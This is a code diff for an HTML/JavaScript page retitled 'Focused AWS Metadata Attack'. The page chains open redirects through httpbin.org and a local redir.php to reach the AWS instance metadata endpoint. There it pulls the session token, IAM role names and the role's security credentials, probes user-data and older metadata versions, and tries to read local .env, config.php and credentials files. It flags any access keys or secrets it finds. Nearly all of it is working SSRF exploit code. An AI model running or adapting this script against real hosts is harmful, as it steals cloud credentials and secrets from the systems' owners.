@@ -1,90 +1,108 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Simple Token Verification</title>
+    <title>Focused AWS Token Attack</title>
 </head>
 <body>
-    <h1>🔍 Simple Token Verification Test</h1>
+    <h1>🎯 Focused AWS Metadata Attack - Token Chain</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Test the exact endpoint that returned 12 bytes earlier
-        results += "<h2>🔐 AWS Metadata Token Endpoint Test</h2>";
-        results += "<p>Earlier result: 'Chain 10: http://169.254.169.254/latest/api/token SUCCESS: 12 bytes'</p>";
-        
+        // Step 1: Get the 12-byte token response we saw earlier
         try {
-            // The exact chain that worked before
+            results += "<h2>🔐 Step 1: Extract AWS Metadata Token</h2>";
+            var xhr1 = new XMLHttpRequest();
             var tokenUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/api/token';
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(tokenUrl), false);
-            xhr.send();
+            xhr1.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(tokenUrl), false);
+            xhr1.send();
             
-            results += "<div style='background:#e8f5e8;padding:15px;border:2px solid green;'>";
-            results += "<strong>Token Endpoint Response:</strong><br>";
-            results += "Length: " + xhr.responseText.length + " bytes<br>";
-            results += "Content: <code style='background:#fff;padding:5px;'>" + xhr.responseText + "</code><br>";
-            results += "Content (hex): <code style='background:#fff;padding:5px;'>" + xhr.responseText.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ') + "</code>";
-            results += "</div>";
+            var token = xhr1.responseText.trim();
+            results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>✅ Token Response: " + xhr1.responseText.length + " bytes</div>";
+            results += "<div style='background:#fff3cd;padding:10px;border:1px solid orange;'>🔑 Token Content: <code>" + token + "</code></div>";
             
-            // Check if this looks like a valid token
-            var text = xhr.responseText.trim();
-            if(text.length > 5 && !text.includes('401') && !text.includes('Unauthorized')) {
-                results += "<div style='background:#32cd32;color:white;padding:10px;'>🎯 Potential Valid Token Response!</div>";
+            // Step 2: If we got a token, use it to access metadata
+            if(token && token.length > 5) {
+                results += "<h2>🎯 Step 2: Use Token to Access AWS Credentials</h2>";
                 
-                // Now try to use this token to access metadata
-                results += "<h3>🔑 Testing Token Usage</h3>";
+                // Try to access IAM security credentials with the token
+                var credUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/';
+                var xhr2 = new XMLHttpRequest();
+                xhr2.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(credUrl), false);
+                // Note: We can't set custom headers through this chain, so this might still fail
+                xhr2.send();
                 
-                // Test basic metadata access
-                var metadataTests = [
-                    'http://169.254.169.254/latest/meta-data/',
-                    'http://169.254.169.254/latest/meta-data/iam/',
-                    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-                    'http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role'
-                ];
+                results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>📋 IAM Roles Response: " + xhr2.responseText.length + " bytes</div>";
+                results += "<div style='background:#f0f0f0;padding:10px;'>" + xhr2.responseText + "</div>";
                 
-                for(var i = 0; i < metadataTests.length; i++) {
-                    var testUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=' + metadataTests[i];
-                    var testXhr = new XMLHttpRequest();
-                    testXhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(testUrl), false);
-                    testXhr.send();
+                // If we get a role name, try to access its credentials
+                var roleName = xhr2.responseText.trim();
+                if(roleName && roleName.length > 0 && !roleName.includes('401') && !roleName.includes('Unauthorized')) {
+                    var roleCredUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' + roleName;
+                    var xhr3 = new XMLHttpRequest();
+                    xhr3.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(roleCredUrl), false);
+                    xhr3.send();
                     
-                    results += "<h4>Test: " + metadataTests[i].split('169.254.169.254/')[1] + "</h4>";
-                    results += "<div style='background:#f0f0f0;padding:8px;'>Response (" + testXhr.responseText.length + " bytes): " + testXhr.responseText.substring(0, 100) + "...</div>";
-                    
-                    if(testXhr.responseText.includes('AccessKeyId') || testXhr.responseText.includes('SecretAccessKey')) {
-                        results += "<div style='background:#ff0000;color:white;padding:15px;border:4px solid red;text-align:center;'>🚨🚨🚨 CREDENTIALS FOUND! 🚨🚨🚨</div>";
-                    }
+                    results += "<div style='background:#ff6b6b;color:white;padding:15px;border:3px solid red;'>🚨 ROLE CREDENTIALS ATTEMPT 🚨</div>";
+                    results += "<div style='background:#f0f0f0;padding:10px;white-space:pre-wrap;'>" + xhr3.responseText + "</div>";
                 }
-            } else {
-                results += "<div style='background:#ffeaa7;padding:10px;'>⚠️ Token response might be an error message</div>";
             }
             
         } catch(e) {
             results += "<div style='background:#ffe8e8;padding:10px;'>❌ Error: " + e.message + "</div>";
         }
         
-        // Also test user data which might contain credentials
-        results += "<h2>📄 AWS User Data Test</h2>";
-        results += "<p>User data often contains bootstrap scripts with AWS credentials</p>";
+        // Step 3: Try alternative credential sources via the working chain
+        results += "<h2>🔍 Step 3: Alternative Credential Sources</h2>";
         
-        try {
-            var userDataUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/user-data/';
-            var userXhr = new XMLHttpRequest();
-            userXhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(userDataUrl), false);
-            userXhr.send();
+        var altSources = [
+            // AWS User Data (often contains credentials)
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/user-data/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data/',
             
-            results += "<div style='background:#e8f5e8;padding:10px;'>User Data Response (" + userXhr.responseText.length + " bytes):</div>";
+            // Try accessing older AWS metadata versions (might not need tokens)
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/',
             
-            if(userXhr.responseText.includes('AWS_ACCESS_KEY') || userXhr.responseText.includes('export AWS') || userXhr.responseText.includes('aws configure')) {
-                results += "<div style='background:#ff0000;color:white;padding:15px;border:4px solid red;text-align:center;'>🎉 AWS CREDENTIALS IN USER DATA! 🎉</div>";
+            // Try known role names directly
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/S3Role',
+            
+            // Local credential files via internal redirector
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://127.0.0.1/.env',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://127.0.0.1/config.php',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://127.0.0.1/credentials',
+        ];
+        
+        for(var i = 0; i < altSources.length; i++) {
+            try {
+                results += "<h4>🔍 " + (i+1) + ": " + altSources[i].split('127.0.0.1/redir.php?url=')[1] + "</h4>";
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(altSources[i]), false);
+                xhr.send();
+                
+                if(xhr.responseText && xhr.responseText.trim().length > 5) {
+                    results += "<div style='background:#e8f5e8;padding:8px;border:1px solid green;'>✅ " + xhr.responseText.length + " bytes</div>";
+                    
+                    var text = xhr.responseText.toLowerCase();
+                    if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
+                        results += "<div style='background:#ff0000;color:white;padding:15px;border:4px solid red;text-align:center;'>🎉🎉🎉 AWS CREDENTIALS FOUND! 🎉🎉🎉</div>";
+                    }
+                    if(text.includes('asia') && text.includes('secret')) {
+                        results += "<div style='background:#ff4500;color:white;padding:10px;'>🔑 AWS ACCESS KEY PATTERN!</div>";
+                    }
+                    if(!text.includes('401') && !text.includes('unauthorized') && !text.includes('not found')) {
+                        results += "<div style='background:#90ee90;padding:8px;'>✅ Successful Access!</div>";
+                    }
+                    
+                    results += "<div style='background:#f0f0f0;padding:8px;max-height:100px;overflow:scroll;font-size:10px;'>" + xhr.responseText.substring(0, 500) + "</div>";
+                } else {
+                    results += "<div style='background:#ffe8e8;padding:3px;'>❌ No response</div>";
+                }
+            } catch(e) {
+                results += "<div style='background:#ffe8e8;padding:3px;'>❌ Failed</div>";
             }
-            
-            results += "<div style='background:#f0f0f0;padding:10px;max-height:150px;overflow:scroll;font-size:10px;white-space:pre-wrap;'>" + userXhr.responseText + "</div>";
-            
-        } catch(e) {
-            results += "<div style='background:#ffe8e8;padding:10px;'>❌ User data error: " + e.message + "</div>";
         }
         
         document.getElementById("results").innerHTML = results;
